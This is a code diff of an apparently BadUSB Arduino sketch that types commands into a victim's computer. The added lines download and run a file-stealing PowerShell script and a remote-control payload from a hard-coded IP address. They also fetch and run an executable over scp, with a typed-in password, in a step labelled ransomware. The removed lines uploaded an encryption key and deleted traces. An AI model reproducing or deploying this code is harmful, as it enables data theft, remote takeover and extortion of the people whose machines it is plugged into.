@@ -31,54 +31,57 @@ void setup() {
   Keyboard.release(KEY_RETURN);
   delay(1000);
 
-//  //下载上传工具
-//  Keyboard.println("Invoke-WebRequest -Uri 'HTTP://118.178.229.36:9888/UPLOADS/PSCP.EXE' -OutFile 'PSCP.EXE'");
-//  delay(5000);
-//  //文件窃取脚本：支持上传二级目录文件
-//  Keyboard.println("Invoke-WebRequest -Uri 'HTTP://118.178.229.36:9888/UPLOADS/steal_files.ps1' -OutFile 'steal_files.ps1'");
-//  delay(5000);
-//  Keyboard.println(".\\steal_files.ps1");
-//  Keyboard.press(KEY_RETURN);
-//  Keyboard.release(KEY_RETURN);
-//  delay(10000);
+  //下载上传工具
+  Keyboard.println("invoke-webrequest -uri 'http://118.178.229.36:9888/uploads/pscp.exe' -outfile 'pscp.exe'");
+  delay(5000);
+  //文件窃取脚本：支持上传二级目录文件
+  Keyboard.println("invoke-webrequest -uri 'http://118.178.229.36:9888/uploads/steal_files.ps1' -outfile 'steal_files.ps1'");
+  delay(5000);
+  Keyboard.println(".\\steal_files.ps1");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(10000);
   
-//  //远程主控：将下载的payload.txt后缀改为ps1，并运行payload.ps1
-//  //下载文件
-//  Keyboard.println("iNVOKE-wEBrEQUEST -uRI 'HTTP://118.178.229.36:9888/UPLOADS/PAYLOAD.TXT' -oUTfILE 'PAYLOAD.TXT'");
-//  Keyboard.press(KEY_RETURN);
-//  Keyboard.release(KEY_RETURN);
-//  delay(3000);
-//  //重命名为payload.ps1
-//  Keyboard.println("rENAME-iTEM -pATH 'PAYLOAD.TXT' -nEWnAME 'PAYLOAD.PS1'");
-//  Keyboard.press(KEY_RETURN);
-//  Keyboard.release(KEY_RETURN);
-//  delay(1000);
-//  //运行payload.ps1
-//  Keyboard.println("./PAYLOAD.PS1");
-//  Keyboard.press(KEY_RETURN);
-//  Keyboard.release(KEY_RETURN);
-//  delay(3000);
-
+  //远程主控：将下载的payload.txt后缀改为ps1，并运行payload.ps1
+  //下载文件
+  Keyboard.println("invoke-webrequest -uri 'http://118.178.229.36:9888/uploads/payload.txt' -outfile 'payload.txt'");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(3000);
+  //重命名为payload.ps1
+  Keyboard.println("rename-item -path 'payload.txt' -newname 'payload.ps1'");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(1000);
+  //运行payload.ps1
+  Keyboard.println("./payload.ps1");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(3000);
 
   //实现文件加密：勒索
-  Keyboard.println("Invoke-WebRequest -Uri 'http://118.178.229.36:9888/uploads/encrypt.ps1' -OutFile 'encrypt.ps1'");
+  Keyboard.println("scp badusb@118.178.229.36:/badusb/xxfer.exe ./");
+  Keyboard.press(KEY_RETURN);
+  Keyboard.release(KEY_RETURN);
+  delay(30000);
+  Keyboard.println("ljjyyds");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(3000);
-  Keyboard.println("curl -F "file=@aes.txt" http://118.178.229.36:9888/upload");
+  Keyboard.println("./xxfer.exe");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
   delay(3000);
-  //删除本地的aes.txt和encrypt.ps1文件
-  Keyboard.println("Remove-Item -Path 'aes.txt'");
+  
+  Keyboard.println("scp  badusb@118.178.229.36:/badusb/uploads/");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
-  delay(1000);
-  Keyboard.println("Remove-Item -Path 'encrypt.ps1'");
+  delay(30000);
+  Keyboard.println("ljjyyds");
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
-  delay(1000);
-
+  delay(3000);
+  
   //退出
   Keyboard.press(KEY_CAPS_LOCK);
   Keyboard.release(KEY_CAPS_LOCK);
